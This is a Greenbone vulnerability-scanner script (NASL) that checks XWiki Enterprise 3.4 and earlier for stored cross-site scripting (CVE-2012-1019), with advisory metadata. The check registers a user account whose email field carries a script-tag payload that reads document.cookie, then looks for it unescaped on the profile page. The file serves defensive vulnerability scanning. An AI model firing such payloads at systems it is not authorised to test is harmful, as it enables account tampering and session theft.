# SPDX-FileCopyrightText: 2012 Greenbone AG
# Some text descriptions might be excerpted from (a) referenced
# source(s), and are Copyright (C) by the respective right holder(s).
#
# SPDX-License-Identifier: GPL-2.0-only

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.802397");
  script_version("2023-07-21T05:05:22+0000");
  script_cve_id("CVE-2012-1019");
  script_tag(name:"cvss_base", value:"4.3");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:M/Au:N/C:N/I:P/A:N");
  script_tag(name:"last_modification", value:"2023-07-21 05:05:22 +0000 (Fri, 21 Jul 2023)");
  script_tag(name:"creation_date", value:"2012-03-09 11:12:00 +0530 (Fri, 09 Mar 2012)");

  script_name("XWiki Enterprise Multiple Cross-Site Scripting Vulnerabilities");

  script_xref(name:"URL", value:"http://secunia.com/advisories/47885");
  script_xref(name:"URL", value:"http://www.securityfocus.com/bid/51867");
  script_xref(name:"URL", value:"http://xforce.iss.net/xforce/xfdb/73010");
  script_xref(name:"URL", value:"http://st2tea.blogspot.com/2012/02/xwiki-cross-site-scripting.html");
  script_xref(name:"URL", value:"http://packetstormsecurity.org/files/109447/XWiki-Enterprise-3.4-Cross-Site-Scripting.html");

  script_copyright("Copyright (C) 2012 Greenbone AG");
  script_category(ACT_DESTRUCTIVE_ATTACK); # Stored XSS
  script_tag(name:"qod_type", value:"remote_analysis");
  script_family("Web application abuses");
  script_dependencies("gb_xwiki_enterprise_detect.nasl");
  script_require_ports("Services/www", 8080);
  script_mandatory_keys("xwiki/detected");

  script_tag(name:"impact", value:"Successful exploitation will allow remote attackers to insert arbitrary HTML
  and script code, which will be executed in a user's browser session in the context of an affected site.");

  script_tag(name:"affected", value:"XWiki version 3.4 and prior");

  script_tag(name:"insight", value:"The flaws are due to an improper validation of user-supplied input via

  - the 'XWiki.XWikiComments_comment' parameter to
  'xwiki/bin/commentadd/Main/WebHome' when posting a comment.

  - the 'XWiki.XWikiUsers_0_company' parameter when editing a user's profile

  - the 'projectVersion' parameter to
  'xwiki/bin/view/DownloadCode/DownloadFeedback' when downloading a file.

  Which allows attackers to execute arbitrary HTML and script code in a
  user's browser session in the context of an affected site.");

  script_tag(name:"solution", value:"No known solution was made available for at least one year
  since the disclosure of this vulnerability. Likely none will be provided anymore.
  General solution options are to upgrade to a newer release, disable respective
  features, remove the product or replace the product by another one.");

  script_tag(name:"summary", value:"XWiki Enterprise is prone to cross-site scripting vulnerabilities.");

  script_tag(name:"solution_type", value:"WillNotFix");
  exit(0);
}

CPE = "cpe:/a:xwiki:xwiki";

include("host_details.inc");
include("http_func.inc");
include("http_keepalive.inc");

if (!xwikiPort = get_app_port(cpe: CPE))
  exit(0);

if (!dir = get_app_location(cpe: CPE, port: xwikiPort))
  exit(0);

if (dir == "/")
  dir = "";

useragent = http_get_user_agent();
host = http_host_name( port:xwikiPort );

url = dir + "/bin/register/XWiki/Register";

sndReq = http_get(item:url, port:xwikiPort);
rcvRes = http_keepalive_send_recv(port:xwikiPort, data:sndReq);

tokenValue = eregmatch(pattern:'name="form_token" value="([a-zA-Z0-9]+)"',
                       string:rcvRes);

if(!tokenValue || !tokenValue[1]){
  exit(0);
}

postdata = "form_token="+ tokenValue[1] +"&register_first_name=ppp&"        +
           "register_last_name=ppp&xwikiname=PppPpp&register_password=secpod&" +
           "register2_password=secpod&register_email=<script>alert(document."  +
           "cookie)</script>@gmail.com&template=XWiki.XWikiUserTemplate&"   +
           "xredirect=";

req = string("POST ", url, " HTTP/1.1\r\n",
             "Host: ", host, "\r\n",
             "User-Agent: ", useragent, "\r\n",
             "Referer: http://", host, url, "\r\n",
             "Content-Type: application/x-www-form-urlencoded\r\n",
             "Content-Length: ", strlen(postdata), "\r\n",
             "\r\n", postdata);

res = http_keepalive_send_recv(port:xwikiPort, data:req);

if (res)
{
  url = "/xwiki/bin/view/XWiki/PppPpp";

  if(http_vuln_check(port:xwikiPort, url:url, check_header: TRUE,
     pattern:"<script>alert\(document.cookie\)</script>"))
  {
    security_message(port:xwikiPort);
    exit(0);
  }
}

exit(99);
